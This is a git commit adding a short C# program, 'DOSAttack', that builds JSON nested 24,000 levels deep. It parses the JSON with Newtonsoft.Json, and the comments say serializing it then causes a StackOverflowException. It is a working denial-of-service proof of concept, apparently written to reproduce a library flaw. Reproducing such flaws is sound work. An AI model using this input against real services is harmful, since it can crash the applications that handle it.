40516025b04db3d19c735cee53199e95042765b7
Sriharsha Pallekonda <srpallek@microsoft.com>
2019-05-13 16:11:35 +0530

    Add project files.

---
+++ DOSAttack/Program.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System;
+using System.IO;
+using System.Linq;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+
+namespace DOSAttack
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            int nRep = 24000;
+            string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
+                          string.Concat(Enumerable.Repeat("}", nRep));
+
+            //Parse this object (Parsing works well - no exception is being thrown)
+            var parsedJson = JObject.Parse(json);
+
+            using (var ms = new MemoryStream())
+            using (var sWriter = new StreamWriter(ms))
+            using (var jWriter = new JsonTextWriter(sWriter))
+            {
+                //Trying to serialize the object will result in StackOverflowException !!!
+                parsedJson.WriteTo(jWriter);
+            }
+        }
+    }
+}
